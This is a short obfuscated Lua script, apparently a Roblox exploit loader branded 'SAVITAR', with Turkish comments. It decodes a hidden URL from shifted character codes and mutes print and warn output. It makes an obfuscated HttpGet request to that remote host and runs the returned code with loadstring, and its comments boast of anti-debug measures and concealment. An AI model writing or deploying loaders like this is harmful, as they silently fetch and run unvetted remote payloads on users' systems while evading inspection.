local _1 = string; local _2 = table; local _3 = game;
local _4 = {116,128,128,124,127,70,59,59,115,117,127,128,58,115,117,128,116,129,110,129,127,113,126,111,123,122,128,113,122,128,58,111,123,121,59,67,95,109,130,117,128,109,126,59,63,65,109,66,113,112,109,113,114,68,114,62,114,66,69,67,62,114,62,114,62,63,68,68,65,111,110,111,63,61,62,113,59,126,109,131,59,110,61,69,110,109,110,112,113,60,60,109,69,63,60,62,63,64,112,65,61,112,111,111,62,113,114,112,111,63,62,61,114,67,113,112,112,113,61,69,65,59,82,96,77,92,57,95,77,98,85,96,77,94,57,84,97,78,57,78,81,96,77}

local function _X(_D)
    local _H = (#_3.Name % 4) + 2
    local _R = {}
    for i = 1, #_D do
        -- Gerçek Dinamik Kaydırma: i değişkenini denkleme soktuk
        local _O = (i % 2 == 0) and 1 or 0
        _R[i] = _1.char(_D[i] - 12 - _O) 
    end
    return _2.concat(_R)
end

local _O = {
    ["\103\101\116"] = function(s, u) return s["\72\116\116\112\71\101\116"](s, u, true) end,
    ["\101\120\101"] = loadstring
}

local function _S()
    local p, w = print, warn;
    print, warn = function() end, function() end;
    
    -- Hafif Anti-Debug
    if not _3:IsLoaded() then _3.Loaded:Wait() end
    if #_3.Name < 1 then return end

    local u = _X(_4) .. "?v=" .. math.random(1000, 9999)
    -- HttpGet çağrısını daha da kararttık
    local s, c = pcall(_O["\103\101\116"], _3, u)
    
    print, warn = p, w;
    
    if s and c and #c > 20 then
        local f = _O["\101\120\101"](c)
        if f then 
            task.spawn(f) 
        end
    else
        _3:GetService("TestService"):Message("SAVITAR: Security Alert 0x44")
    end
end

_S()
